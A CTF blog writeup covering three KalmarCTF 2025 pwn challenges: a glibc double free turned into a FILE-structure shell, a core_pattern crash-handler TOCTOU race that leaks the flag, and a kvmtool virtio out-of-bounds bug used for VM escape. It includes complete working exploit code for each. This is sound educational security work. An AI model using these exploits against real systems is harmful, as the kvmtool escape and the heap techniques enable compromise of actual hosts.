---
来源: https://ptr-yudai.hatenablog.com/entry/2025/03/10/123050
类型: 博客writeup
获取日期: 2026-06-30
说明: ptr-yudai 2025年3月文章
---

、90日以上更新していないブログに表示しています。


I got a cold last weekend and spent my free time playing KalmarCTF 2025 in BunkyoWesterns to boost my immune system.
It's been a long time since I last posted a writeup.
I've been busy to write an article, but I felt I needed to do it because the challenges in this CTF were notable.

* [[Pwn 354pt] Merger](#Pwn-354pt-Merger)
  + [Bug analysis](#Bug-analysis)
  + [Exploitation](#Exploitation)
* [[Pwn 427pt] decore](#Pwn-427pt-decore)
  + [Bug analysis](#Bug-analysis-1)
  + [Exploitation](#Exploitation-1)
* [[Pwn 578pt] KalmarVM](#Pwn-578pt-KalmarVM)
  + [Bug analysis](#Bug-analysis-2)
  + [Exploitation](#Exploitation-2)

Other member's writeup:

[nanimokangaeteinai.hateblo.jp](https://nanimokangaeteinai.hateblo.jp/entry/2025/03/10/041721)

# [Pwn 354pt] Merger

This challenge looked simple at first glance, but it was new to me.
It is a typical note manager with 4 functions available: add, [drop](https://d.hatena.ne.jp/keyword/drop), show, merge.

## Bug analysis

The [most](https://d.hatena.ne.jp/keyword/most) notable function, of course, is merge.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250310/20250310090707.png)

Decompiled merge function

This function reads two index values, concatenates the second note into the first one, and discards the second one.

The bug is simple.
If you give those indexes the same [value](https://d.hatena.ne.jp/keyword/value), something bad will happen.

Let's assume that `realloc` is replaced by `malloc`+`free`. [\*1](#f-9aa5c544 "This is not correct to be precise.")
Then, this function works as the following:

1. `newNote1 = malloc(newLength)` (in realloc)
2. `strcpy(newNote1, oldNote1);` (in realloc)
3. `free(oldNote1)` (in realloc)
4. `strcat(newNote1, oldNote2);`
5. `free(oldNote2)`

If the two indexes are the same [value](https://d.hatena.ne.jp/keyword/value), `oldNote1` is identical to `oldNote2`, which may cause a double free.
Thanks to the following order of code, there's no use-after-free unfortunately.

```
    arr[idx1] = sa;
    arr[idx2] = 0LL;
```

In addition, `realloc` does not actually call `malloc` if `newLength` is equal or smaller than the capacity of `oldNote1`.
The following will occur in this case.

1. (Do nothing. Just shrink the chunk of `oldNote1`.)
2. `strcat(oldNote1, oldNote2);`
3. `free(oldNote2);`

Nothing bad will happen in this case even if `oldNote1` is identical to `oldNote2` because `realloc` does not release the old pointer.
In conclusion, we need to make `realloc` actually "reallocate" a chunk in order to cause the double free.

## Exploitation

After this [cursed patch](https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d), double free became useful only in the following cases:

1. Double free in **fastbin** without freeing the same chunk consecutively
2. First free to **fastbin**, second free to **tcachebin**
3. First free to **unsortedbin**, second free to **tcachebin** [\*2](#f-e09024af "largebin or smallbin are fine too.")
4. First free to **unsortedbin**, second free to **fastbin**

Otherwise the second free will be caught by some [glibc](https://d.hatena.ne.jp/keyword/glibc) mitigations.

(a) is not an option because the first free (in `realloc`) and the second free take place consecutively.
(b) is also infeasible because there's no way to use fastbin before tcache in two consecutive frees.

(c) and (d) looks infeasible due to the same reason as that of (b).
However, unsortedbin has a feature to coalesce chunks.
If the chunk is consolidated backwardly during the first free, the size of the chunk changes.
Thus, the second free can link to a different tcachebin.

The following PoC explains better:

```
for i in range(7):
    add(i, 0x87, "A"*0x86)
for i in range(7):
    add(7+i, 0x97, "A"*0x96)
add(14, 0x97, "C"*0x96) # target chunk
add(15, 0x87, "D"*0x86) # consolidated chunk
add(16, 0x17, "E"*0x16)

for i in range(7): # fill tcache
    drop(i)
    drop(7+i)
drop(15) # linked to unsortedbin

# Realloc frees chunk 14.
# Chunk 14 is coalesced with chunk 15 and is linked to unsortedbin.
# The second free links chunk 14 to tcachebin because the chunk size is now 0x130(=0xa0+0x90).
merge(14, 14)
```

Since the merge function outputs the merged note, we can leak a heap or libc address after the double free is complete.
With this leaked libc address, we can fix the corrupted unsortedbin.

However, we cannot allocate a chunk from tcachebin for 0x130 because of the following size check in the add function.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250310/20250310094707.png)

Size check in add function

`realloc` is not useful as it does not use the tcachebin.
So, we need to consolidate with an unsortedbin chunk smaller than 0x80.

This is not a big problem.
We can prepare a small unsortedbin chunk simply by splitting a larger unsortedbin chunk.

After fixing the corrupted unsortedbin, we will get a strong use-after-free primitive.

Final exploit:

```
from ptrlib import *

def add(index, size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("index: ", str(index))
    sock.sendlineafter("size: ", str(size))
    sock.sendlineafter("data: ", data)

def drop(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("index: ", str(index))
    
def show(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("index: ", str(index))
    return sock.recvline().strip()

def merge(dst, src):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("dst: ", str(dst))
    sock.sendlineafter("src: ", str(src))
    sock.recvuntil("Merged: ")
    return sock.recvline().strip()

#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
#sock = Process("./merger")
libc = ELF("./libc.so.6")
sock = Socket("nc merger.chal-kalmarc.tf 1337")
#sock = Socket("nc localhost 1337")
sock.debug = True

for i in range(7):
    add(i, 0xf7, "A"*0xf6)
for i in range(7):
    add(7+i, 0x87, "A"*0x86)
add(30, 0xf7, "D"*0xf6)
add(31, 0x17, "E"*0x16)

for i in range(7):
    drop(i)
drop(30) # make big unsortedbin chunk
add(29, 0x87, "C"*0x86) # make small unsortedbin chunk
for i in range(7):
    add(i, 0xf7, b"A"*0xf6)
for i in range(7):
    drop(7+i)

# Overlap tcache and unsortedbin
leak = merge(29, 29) # 29 goes to both unsortedbin and tcache
libc.base = u64(leak[0x86:]) - libc.main_arena() - 0x60

# Fix unsortedbin
add(29, 0xf7, p64(libc.main_arena() + 0x60)*2) # alloc from tcache
add(30, 0x77, b"0"*0x76)

# Fill tcache
for i in range(8):
    add(7+i, 0x77, b"A"*0x76)
for i in range(7):
    drop(7+i)

# Prepare target
for i in range(3):
    add(i, 0xf7, b"A"*0xf6)
for i in range(3):
    drop(i)

# Double free
drop(30) # fastbin
heap_base = u64(show(29)) << 12
logger.info("heap = " + hex(heap_base))
drop(14)
drop(29) # double free on fastbin

for i in range(7):
    add(7+i, 0x77, b"A"*0x76)
add(29, 0x77, p64((heap_base + 0x1550) ^ (heap_base >> 12)))

# tcache poisoning
add(14, 0x77, b"A"*0x76)
add(30, 0x77, b"A"*0x76)
add(31, 0x77, p64(libc.symbol("_IO_2_1_stderr_") ^ ((heap_base + 0x1000) >> 12)))

# Corrupt FILE
payload  = p32(0xfbad0101) + b";sh\0" # fp->_flags & _IO_UNBUFFERED == 0)
payload += b"\x00" * (0x58 - len(payload))
payload += p64(libc.symbol("system")) # vtable->iowalloc
payload += b"\x00" * (0x88 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xa0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # _wide_data (1)
payload += b"\x00" * (0xc0 - len(payload))
payload += p32(1) # fp->_mode != 0
payload += b"\x00" * (0xd0 - len(payload))
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10) # (1) _wide_data->vtable
payload += p64(libc.symbol("_IO_wfile_jumps") + 0x18 - 0x58) # _IO_wfile_jumps + delta
payload += p64(0xfbad2887)
add(0, 0xf7, b"neko")
add(1, 0xf7, payload)

sock.sendlineafter("> ", "1")
sock.sendlineafter(": ", "-1")

sock.sendline("cat /flag*")

sock.sh()
```

I like this challenge because the design is simple but the exploitation is neither too easy nor too complex.

# [Pwn 427pt] decore

This challenge was new to me again.
The target to exploit is a binary set in `core_pattern`.

```
echo "|/usr/bin/crashhandler %p" > /proc/sys/kernel/core_pattern
```

This crashhandler parses a core file and writes some information into a log file.

So, our goal is to escalate privilege by "maliciously" crashing a program.

## Bug analysis

What the crashhandler is doing is basically:

1. Reads a core file with `PT_NOTE`
2. Parses `NT_SIGINFO`, `NT_PRSTATUS`, and `NT_FILE`
3. Dumps RIP for each thread of the crashed program
4. Tries to find a symbol corresponding to the RIP
   1. Every file written in `NT_FILE` is opened in step (2)
   2. If an ELF file is mapped on where the RIP points to, proceed to step (c)
   3. Parses SYMTAB, DYNSYM, and STRTAB of the ELF
   4. Finds a corresponding symbol

Although this challenge requires reversing the program, the bug is simple enough.
There's no bound check when parsing the STRTAB.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250310/20250310100821.png)

Another subtle problem is it does not unmap a memory if the mapped file is not an ELF.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250310/20250310100939.png)

So, my first idea was:

1. Somehow map `/flag`
2. Use oob-read in STRTAB parser, which will output the flag as a function symbol

## Exploitation

The problem is that we need to map `/flag` **inside** the program to crash.
This is obviously infeasible because we don't have a permission to open `/flag`.

I was trying to use `memfd_create` and set the name to something like `memfd:/../../../../flag` for path traversal.
However, an anonymous file always has a string `(deleted)` added to the back.

After wasting time on reading documentations, I finally came up an idea.
Since we have a plenty of time between the crash of our program and the start of the crash handler, we can alternate a file into a symbolic link to `/flag`.
In fact, this TOCTOU worked as intended.

Here is my exploit. [I believe](https://d.hatena.ne.jp/keyword/I%20believe) the comments explain enough.

```
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>
#include <stdint.h>

#define NEKO "/home/ctf/neko"
#define TORI "/home/ctf/tori"

struct Elf64_Ehdr {
  unsigned char e_ident[0x10];
  uint16_t e_type;
  uint16_t e_machine;
  uint32_t e_version;
  uint64_t e_entry;
  uint64_t e_phoff;        /* Program header table file offset */
  uint64_t e_shoff;        /* Section header table file offset */
  uint32_t e_flags;
  uint16_t e_ehsize;
  uint16_t e_phentsize;
  uint16_t e_phnum;
  uint16_t e_shentsize;
  uint16_t e_shnum;
  uint16_t e_shstrndx;
};

struct Elf64_Shdr {
  uint32_t sh_name;
  uint32_t sh_type;
  uint64_t sh_flags;
  uint64_t sh_addr;
  uint64_t sh_offset;
  uint64_t sh_size;
  uint32_t sh_link;
  uint32_t sh_info;
  uint64_t sh_addralign;
  uint64_t sh_entsize;
};

__attribute__((packed))
struct Elf64_Sym {
  uint32_t        st_name;
  unsigned char   st_info;
  unsigned char   st_other;
  uint16_t        st_shndx;
  uint64_t        st_value;
  uint64_t        st_size;
};

void* th2(void* arg) {
  ((void(*)())(arg + 4))(); // Thread 1: Lives on a malicious ELF (Infinite loop)
  return NULL;
}

int main() {
  int fd;

  struct Elf64_Ehdr ehdr = { 0 };
  struct Elf64_Shdr shdr1 = { 0 };
  struct Elf64_Shdr shdr2 = { 0 };
  struct Elf64_Shdr shdr3 = { 0 };
  struct Elf64_Sym sym = { 0 };
  memcpy(ehdr.e_ident, "\x7f\x45\x4c\x46", 4);
  memcpy(ehdr.e_ident + 4, "\xeb\xfe", 2); // jmp 0
  ehdr.e_type = 3; // ET_DYN
  ehdr.e_shnum = 2;
  ehdr.e_shoff = 0x40;

  // SYMTAB
  shdr1.sh_type = 2;
  shdr1.sh_size = 0x18;
  shdr1.sh_offset = sizeof(ehdr) + sizeof(shdr1) + sizeof(shdr2) + sizeof(shdr3);
  shdr1.sh_link = 2;
  // DYNSYM
  shdr2.sh_type = 11;
  shdr2.sh_link = 2;
  // STRTAB
  shdr3.sh_type = 0;

  sym.st_name = 0x1000; // Out of bound
  sym.st_value = 1;
  sym.st_info = 2;

  /* Create and map a malicious ELF */
  fd = open(NEKO, O_RDWR | O_CREAT | O_TRUNC, 0666);
  write(fd, &ehdr, sizeof(ehdr));
  write(fd, &shdr1, sizeof(shdr1));
  write(fd, &shdr2, sizeof(shdr2));
  write(fd, &shdr3, sizeof(shdr3));
  write(fd, &sym, sizeof(sym));
  write(fd, "AAAABBBBCCCCDDDD", 0x10);
  close(fd);

  fd = open(NEKO, O_RDWR | O_CREAT, 0666);
  void *p = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
  printf("%p\n", p);

  /* TOCTOU: Alternate file while the previous crash analysis is going on */
  unlink(TORI);
  symlink("/flag", TORI);
  usleep(100000);

  /* Create a dummy file
     (We expect the crash handler to read "/flag" instead of this dummy file) */
  unlink(TORI);
  fd = open(TORI, O_RDWR | O_CREAT | O_TRUNC, 0666);
  write(fd, "DUMMY_DUMMY_DUMMY", 17);
  close(fd);
  fd = open(TORI, O_RDWR | O_CREAT, 0666);
  void *code = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);
  printf("%02x %02x\n", *(unsigned char*)code, *(unsigned char*)(code+1));

  /* // Debug
  char buf[0x100];
  sprintf(buf, "cat /proc/%d/maps", getpid());
  system(buf);
  */

  pthread_t th;
  pthread_create(&th, NULL, th2, p);

  usleep(10000);
  ((void(*)())code)(); // Thread 0: Crash on TORI=/flag
  return 0;
}
```

After uploading the exploit to `/home/ctf/exploit`, I used another snippet to execute the exploit until the TOCTOU race works.

```
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>

#define TORI "/home/ctf/tori"
#define N 1000

int main() {
  int status;
  for (size_t i = 0; i < N; i++) {
    int pid = fork();
    if (pid == 0) {
      execve("/home/ctf/exploit", NULL, NULL);
      exit(1);
    } else {
      waitpid(-1, &status, WNOHANG);
    }
    usleep(1000);

    pid = fork();
    if (pid == 0) {
      char *args[] = { "/bin/grep", "kalmar", "/var/log/crash.log", NULL };
      execve("/bin/grep", args, NULL);
    } else {
      waitpid(pid, &status, 0);
    }
  }

  return 0;
}
```

# [Pwn 578pt] KalmarVM

This challenge is a [KVM](https://d.hatena.ne.jp/keyword/KVM) 0-day challenge. [\*3](#f-bad128da "Attention all CTF authors. Could you please stop using your 0-day in a CTF challenge?")

Our goal is to escape a [VM](https://d.hatena.ne.jp/keyword/VM) working on a latest [KVM](https://d.hatena.ne.jp/keyword/KVM) named [kvmtool](https://github.com/kvmtool/kvmtool).

Happy moment:

```
$ checksec lkvm-static
[*] '/home/ptr/kalmar/kalmarvm/lkvm-static'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

## Bug analysis

When I started looking at this challenge, [sugi](https://x.com/mmxsrup) had already found the bug. [\*4](#f-357240ed "He went to a skiing trip once he spotted the bug :(")
I also checked for the code but found only some other useless bugs.

`pci-modern.c` defines some [MMIO](https://d.hatena.ne.jp/keyword/MMIO) handlers. One of them is `virtio_pci.notify_write`:

[kvmtool/virtio/pci-modern.c at e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be · kvmtool/kvmtool · GitHub](https://github.com/kvmtool/kvmtool/blob/e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be/virtio/pci-modern.c#L125-L134)

```
static bool virtio_pci__notify_write(struct virtio_device *vdev,
                     unsigned long offset, void *data, int size)
{
    u16 vq = ioport__read16(data);
    struct virtio_pci *vpci = vdev->virtio;

    vdev->ops->notify_vq(vpci->kvm, vpci->dev, vq);

    return true;
}
```

`vq` is used as an index in `notify_vq`:

[kvmtool/virtio/balloon.c at e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be · kvmtool/kvmtool · GitHub](https://github.com/kvmtool/kvmtool/blob/e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be/virtio/balloon.c#L231-L238)

```
static int notify_vq(struct kvm *kvm, void *dev, u32 vq)
{
    struct bln_dev *bdev = dev;

    thread_pool__do_job(&bdev->jobs[vq]);

    return 0;
}
```

This is an out-of-bound [access](https://d.hatena.ne.jp/keyword/access) in `bdev->jobs`, which causes a crash when `vq` is too big.
I used this bug because `thread_pool__job` struct has a function pointer inside.

## Exploitation

`bdev` is a struct defined in the balloon statistics device.
Balloon is a device to get statistical information of memory usage of the guest from the host.

[kvmtool/virtio/balloon.c at e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be · kvmtool/kvmtool · GitHub](https://github.com/kvmtool/kvmtool/blob/e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be/virtio/balloon.c#L32-L47)

```
struct bln_dev {
    struct list_head   list;
    struct virtio_device   vdev;

    /* virtio queue */
    struct virt_queue  vqs[NUM_VIRT_QUEUES];
    struct thread_pool__job    jobs[NUM_VIRT_QUEUES];

    struct virtio_balloon_stat stats[VIRTIO_BALLOON_S_NR];
    struct virtio_balloon_stat *cur_stat;
    u32         cur_stat_head;
    u16         stat_count;
    int            stat_waitfd;

    struct virtio_balloon_config config;
};
```

You can find `stats` right after the `jobs` array.
[`virtio_balloon_stat`](https://github.com/kvmtool/kvmtool/blob/e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be/include/linux/virtio_balloon.h#L114) is a simple key-[value](https://d.hatena.ne.jp/keyword/value) store.

```
struct virtio_balloon_stat {
    __virtio16 tag;
    __virtio64 val;
} __attribute__((packed));
```

A function named `virtio_bln_do_stat_request` writes to the `stats` array.

[kvmtool/virtio/balloon.c at e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be · kvmtool/kvmtool · GitHub](https://github.com/kvmtool/kvmtool/blob/e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be/virtio/balloon.c#L83-L111)

```
static bool virtio_bln_do_stat_request(struct kvm *kvm, struct bln_dev *bdev, struct virt_queue *queue)
{
    struct iovec iov[VIRTIO_BLN_QUEUE_SIZE];
    u16 out, in, head;
    struct virtio_balloon_stat *stat;
    u64 wait_val = 1;

    head = virt_queue__get_iov(queue, iov, &out, &in, kvm);
    stat = iov[0].iov_base;

    /* Initial empty stat buffer */
    if (bdev->cur_stat == NULL) {
        bdev->cur_stat = stat;
        bdev->cur_stat_head = head;

        return true;
    }

    memcpy(bdev->stats, stat, iov[0].iov_len);

    bdev->stat_count = iov[0].iov_len / sizeof(struct virtio_balloon_stat);
    bdev->cur_stat = stat;
    bdev->cur_stat_head = head;

    if (write(bdev->stat_waitfd, &wait_val, sizeof(wait_val)) <= 0)
        return -EFAULT;

    return 1;
}
```

It looks like the buffer is copied from an I/O [vector](https://d.hatena.ne.jp/keyword/vector).
So, if we can copy arbitrary data through this I/O [vector](https://d.hatena.ne.jp/keyword/vector), the data will be set to `stats` array.
Since there's an OOB [access](https://d.hatena.ne.jp/keyword/access) in `jobs` array, we can confuse a job with a crafted fake job written in `stats`.

After investigating how to write to the I/O [vector](https://d.hatena.ne.jp/keyword/vector), it turned out that the device supported DMA.
In order to use DMA, we have to prepare 3 structs: [`vring_desc`](https://github.com/torvalds/linux/blob/80e54e84911a923c40d7bee33a34c1b4be148d7a/include/uapi/linux/virtio_ring.h#L107-L112), [`vring_avail`](https://github.com/torvalds/linux/blob/80e54e84911a923c40d7bee33a34c1b4be148d7a/include/uapi/linux/virtio_ring.h#L114-L118), and [`vring_used`](https://github.com/torvalds/linux/blob/80e54e84911a923c40d7bee33a34c1b4be148d7a/include/uapi/linux/virtio_ring.h#L121-L135).

Then, we have to set the physical addresses of those 3 structs to `VIRTIO_PCI_COMMON_Q_DESCLO/HI`, `VIRTIO_PCI_COMMON_Q_AVAILLO/HI`, and `VIRTIO_PCI_COMMON_Q_USEDLO/HI` respectively. [\*5](#f-bf87a216 "Someone already used DMA so I had to reset it before I set my own DMA buffer.")

The following figure shows the list of registers when I controlled RIP:

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250310/20250310121103.png)

Since the program has `execl` function, I used it to get the shell. [\*6](#f-2f5744d6 "The console hung up on local but it worked find through socket.")

Final exploit:

```
#define _LARGEFILE64_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/kcmp.h>
#include <sys/syscall.h>
#include <unistd.h>

// https://github.com/kvmtool/kvmtool/blob/e48563f5c4a48fe6a6bc2a98a9a7c84a10f043be/include/linux/virtio_pci.h#L210
#define VIRTIO_PCI_CAP_VNDR        0
#define VIRTIO_PCI_CAP_NEXT        1
#define VIRTIO_PCI_CAP_LEN     2
#define VIRTIO_PCI_CAP_CFG_TYPE        3
#define VIRTIO_PCI_CAP_BAR     4
#define VIRTIO_PCI_CAP_OFFSET      8
#define VIRTIO_PCI_CAP_LENGTH      12
#define VIRTIO_PCI_NOTIFY_CAP_MULT 16
#define VIRTIO_PCI_COMMON_DFSELECT 0
#define VIRTIO_PCI_COMMON_DF       4
#define VIRTIO_PCI_COMMON_GFSELECT 8
#define VIRTIO_PCI_COMMON_GF       12
#define VIRTIO_PCI_COMMON_MSIX     16
#define VIRTIO_PCI_COMMON_NUMQ     18
#define VIRTIO_PCI_COMMON_STATUS   20
#define VIRTIO_PCI_COMMON_CFGGENERATION    21
#define VIRTIO_PCI_COMMON_Q_SELECT 22
#define VIRTIO_PCI_COMMON_Q_SIZE   24
#define VIRTIO_PCI_COMMON_Q_MSIX   26
#define VIRTIO_PCI_COMMON_Q_ENABLE 28
#define VIRTIO_PCI_COMMON_Q_NOFF   30
#define VIRTIO_PCI_COMMON_Q_DESCLO 32
#define VIRTIO_PCI_COMMON_Q_DESCHI 36
#define VIRTIO_PCI_COMMON_Q_AVAILLO    40
#define VIRTIO_PCI_COMMON_Q_AVAILHI    44
#define VIRTIO_PCI_COMMON_Q_USEDLO 48
#define VIRTIO_PCI_COMMON_Q_USEDHI 52
#define VIRTIO_PCI_COMMON_Q_NDATA  56
#define VIRTIO_PCI_COMMON_Q_RESET  58
#define VIRTIO_PCI_COMMON_ADM_Q_IDX    60
#define VIRTIO_PCI_COMMON_ADM_Q_NUM    62

#define VPCI_CFG_COMMON_START 0
#define VPCI_CFG_NOTIFY_START 0x38
#define VPCI_CFG_ISR_START 0x3c
#define VPCI_CFG_DEV_START 0x40

#define QUEUE_SIZE 3

struct vring_desc {
  uint64_t addr;
  uint32_t len;
  uint16_t flags;
  uint16_t next;
};

struct vring_avail {
  uint16_t flags;
  uint16_t idx;
  uint16_t ring[QUEUE_SIZE];
};

struct vring_used_elem {
  uint32_t id;
  uint32_t len;
};

struct vring_used {
  uint16_t flags;
  uint16_t idx;
  struct vring_used_elem ring[QUEUE_SIZE];
};

const off_t DEV_BASE = 0xd2000000;

void fatal(const char *s) {
  perror(s);
  exit(1);
}

uint8_t *mmio_mem;

uint8_t  mmio_inb(size_t off) { return *(volatile uint8_t *)(mmio_mem + off); }
uint16_t mmio_inw(size_t off) { return *(volatile uint16_t *)(mmio_mem + off); }
uint32_t mmio_ind(size_t off) { return *(volatile uint32_t *)(mmio_mem + off); }
void mmio_outb(size_t off, uint8_t val) {
  *(volatile uint8_t *)(mmio_mem + off) = val;
  usleep(1000);
}
void mmio_outw(size_t off, uint16_t val) {
  *(volatile uint16_t *)(mmio_mem + off) = val;
  usleep(1000);
}
void mmio_outd(size_t off, uint32_t val) {
  *(volatile uint32_t *)(mmio_mem + off) = val;
  usleep(1000);
}

uint64_t virt2phys(void *p) {
  uint64_t virt = (uint64_t)p;
  if (virt & 0xfff) fatal("virt2phys: invalid address");

  int fd = open("/proc/self/pagemap", O_RDONLY);
  if (fd == -1) fatal("virt2phys: /proc/self/pagemap");
  lseek(fd, (virt / 0x1000) * 8, SEEK_SET);

  uint64_t phys;
  if (read(fd, &phys, 8) != 8) fatal("virt2phys: read");
  if ((phys & (1ULL << 63)) == 0) fatal("virt2phys: page not found");

  close(fd);
  return (phys & ((1ULL << 54) - 1)) * 0x1000;
}

int main() {
  int fd = open("/dev/mem", O_RDWR);
  if (fd < 0) fatal("/dev/mem");

  unsigned char *dma;
  dma = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE, -1, 0);
  if (dma == MAP_FAILED) fatal("mmap(dma)");

  struct vring_desc *desc = (struct vring_desc *)dma;
  struct vring_avail *avail = (struct vring_avail *)(dma + 0x1000);
  struct vring_used *used = (struct vring_used *)(dma + 0x2000);

  uint64_t desc_addr = virt2phys(dma);
  uint64_t avail_addr = virt2phys(dma + 0x1000);
  uint64_t used_addr = virt2phys(dma + 0x2000);
  uint64_t buf_addr = virt2phys(dma + 0x3000);

  memset(desc, 0, sizeof(struct vring_desc) * QUEUE_SIZE);
  desc[0].addr  = buf_addr;
  desc[0].len   = 64;
  desc[0].flags = 0;
  desc[0].next  = 0;

  memset(avail, 0, sizeof(struct vring_avail));
  avail->flags = 0;
  avail->idx = 1;
  avail->ring[0] = 0;

  memset(used, 0, sizeof(struct vring_used));
  used->flags = 0;
  used->idx = 0;

  *(size_t*)(dma + 0x3000) = 0x477da0; // rip: execl
  *(size_t*)(dma + 0x3008) = 0x525ae5; // rdi: "/bin/sh"
  *(size_t*)(dma + 0x3010) = 0;        // rsi
  *(size_t*)(dma + 0x3018) = 0;
  *(size_t*)(dma + 0x3020) = 0;
  *(size_t*)(dma + 0x3028) = 0;
  *(size_t*)(dma + 0x3030) = 0;
  *(size_t*)(dma + 0x3038) = 0;
  *(size_t*)(dma + 0x3040) = 0;
  *(size_t*)(dma + 0x3048) = 0xfee10000;
  *(size_t*)(dma + 0x3050) = 0xfee11111;

  mmio_mem = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0xd2000000);
  if (mmio_mem == MAP_FAILED) fatal("mmap");

  // DMA copy to stats
  mmio_outw(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_SELECT, 2);
  mmio_outw(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_ENABLE, 0);
  mmio_outw(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_SIZE, 0);

  mmio_outw(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_SELECT, 2);
  mmio_outw(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_SIZE, 128);

  mmio_outd(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_DESCLO, (uint32_t)(desc_addr));
  mmio_outd(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_DESCHI, (uint32_t)(desc_addr >> 32));

  mmio_outd(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_AVAILLO, (uint32_t)(avail_addr));
  mmio_outd(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_AVAILHI, (uint32_t)(avail_addr >> 32));

  mmio_outd(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_USEDLO, (uint32_t)(used_addr));
  mmio_outd(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_USEDHI, (uint32_t)(used_addr >> 32));
  
  mmio_outw(VPCI_CFG_COMMON_START + VIRTIO_PCI_COMMON_Q_ENABLE, 1);

  mmio_outw(VPCI_CFG_NOTIFY_START, 2);

  // OOB access (jobs)
  puts("[+] Win!");
  mmio_outw(VPCI_CFG_NOTIFY_START, 3);

  close(fd);
  return 0;
}
```

[\*1](#fn-9aa5c544):This is not correct to be precise.

[\*2](#fn-e09024af):largebin or smallbin are fine too.

[\*3](#fn-bad128da):Attention all CTF authors. Could you please stop using your 0-day in a CTF challenge?

[\*4](#fn-357240ed):He went to a skiing trip once he spotted the bug :(

[\*5](#fn-bf87a216):Someone already used DMA so I had to reset it before I set my own DMA buffer.

[\*6](#fn-2f5744d6):The console hung up on local but it worked find through socket.


[« 
Midnight Flag CTF 2025 Writeups](https://ptr-yudai.hatenablog.com/entry/2025/04/22/145743)

[AlpacaHack Round 6 (Pwn)のWriteup
 »](https://ptr-yudai.hatenablog.com/entry/2024/11/03/233033)